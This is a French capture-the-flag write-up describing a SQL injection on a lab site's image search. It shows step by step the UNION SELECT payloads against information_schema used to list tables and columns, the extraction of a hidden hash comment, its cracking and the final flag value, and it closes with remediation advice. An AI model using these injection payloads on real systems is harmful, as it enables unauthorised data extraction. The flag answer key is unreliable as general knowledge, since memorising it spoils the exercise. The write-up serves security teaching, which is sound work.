
---

# Exploitation de vulnérabilité SQL pour obtenir un flag

## Description de la faille

Une vulnérabilité SQL Injection permet d'extraire des données sensibles de la base de données. En exploitant cette faille, nous avons pu découvrir une table d'intérêt, obtenir des informations sur ses colonnes, et finalement extraire et transformer des données pour obtenir le flag.

## Étapes pour découvrir la faille

### 1. Initialiser l'injection SQL pour vérifier la vulnérabilité

En essayant la condition toujours vraie `1 OR 1=1`, nous obtenons :

```sql
ID: 1 OR 1=1; --
Title: Nsa
Url : https://fr.wikipedia.org/wiki/Programme_

ID: 1 OR 1=1; --
Title: 42 !
Url : https://fr.wikipedia.org/wiki/Fichier:42

ID: 1 OR 1=1; --
Title: Google
Url : https://fr.wikipedia.org/wiki/Logo_de_Go

ID: 1 OR 1=1; --
Title: Earth
Url : https://en.wikipedia.org/wiki/Earth#/med

ID: 1 OR 1=1; --
Title: Hack me ?
Url : borntosec.ddns.net/images.png
```

### 2. Lister toutes les tables de la base de données

En utilisant une requête UNION pour lister les tables, nous trouvons :

```sql
ID: 1 AND 1=1 UNION SELECT 1, table_name FROM information_schema.tables; --
Title: list_images
Url : 1
```

La table `list_images` semble intéressante, nous allons nous concentrer dessus.

### 3. Lister toutes les colonnes de la table `list_images`

Nous listons les colonnes de la table `list_images` avec les requêtes suivantes :

```sql
ID: 1 AND 1=1 UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_name = 'list_images'; --
```

Les colonnes découvertes sont :

```sql
ID: 1 AND 1=1 UNION SELECT table_name, column_name FROM information_schema.columns; --
Title: id
Url : list_images

ID: 1 AND 1=1 UNION SELECT table_name, column_name FROM information_schema.columns; --
Title: url
Url : list_images

ID: 1 AND 1=1 UNION SELECT table_name, column_name FROM information_schema.columns; --
Title: title
Url : list_images

ID: 1 AND 1=1 UNION SELECT table_name, column_name FROM information_schema.columns; --
Title: comment
Url : list_images
```

### 4. Extraire les données des colonnes intéressantes

Nous allons essayer de voir ce qu'il y a dans chacune de ces colonnes. En vérifiant les colonnes `title` et `comment`, nous trouvons des informations intéressantes :

```sql
ID: 1 AND 1=1 UNION SELECT title, comment FROM list_images; --
Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
Url : Hack me ?
```

### 5. Décrypter et transformer les données pour obtenir le flag

1. **Décrypter le mot de passe** :
   - `1928e8083cf461a51303633093573c46` correspond à `albatroz` en MD5.

2. **Calculer le hash SHA-256** :
   - `albatroz` en SHA-256 donne `f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`.

### Conclusion

En suivant ces étapes, nous avons pu exploiter une vulnérabilité SQL Injection pour extraire des données sensibles et finalement obtenir le flag.

## Flag

```
f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
```

## Recommandations pour remédier à cette faille

Pour corriger et prévenir les failles d'injection SQL, suivez ces bonnes pratiques :

1. **Utilisation de Requêtes Paramétrées (Préparées)** :
   - Les requêtes paramétrées permettent de séparer le code SQL des données utilisateur. Cela empêche les données utilisateur d'être interprétées comme des parties de la commande SQL.

2. **Utilisation des ORM (Object-Relational Mapping)** :
   - Les ORM sont des outils qui permettent de manipuler la base de données en utilisant des objets du langage de programmation plutôt que des commandes SQL directes.

3. **Validation et Échappement des Entrées Utilisateur** :
   - La validation des entrées consiste à vérifier que les données saisies par l'utilisateur sont conformes aux attentes (format, longueur, type, etc.). L'échappement consiste à transformer les caractères spéciaux en leur équivalent sécurisé.

4. **Limiter les Privilèges de la Base de Données** :
   - Restreindre les privilèges des comptes de base de données utilisés par l'application pour limiter l'impact potentiel d'une injection SQL.

5. **Utilisation des Outils de Détection et de Prévention des Intrusions (IDS/IPS)** :
   - Les IDS/IPS sont des systèmes qui surveillent le trafic réseau et les activités de l'application pour détecter et prévenir les tentatives d'attaque.

6. **Tests de Sécurité et Audits Réguliers** :
   - Les tests de sécurité consistent à analyser et tester régulièrement votre application pour identifier et corriger les failles potentielles.

7. **Utilisation de Captchas** :
   - Les captchas permettent de différencier les utilisateurs humains des scripts automatisés, ce qui peut réduire le risque d'attaques automatisées.

8. **Formation et Sensibilisation des Développeurs** :
   - La sensibilisation des développeurs aux meilleures pratiques de sécurité est essentielle pour prévenir les vulnérabilités.

En suivant ces recommandations, vous pouvez considérablement réduire le risque d'injections SQL dans votre application et renforcer globalement la sécurité de votre infrastructure.

---
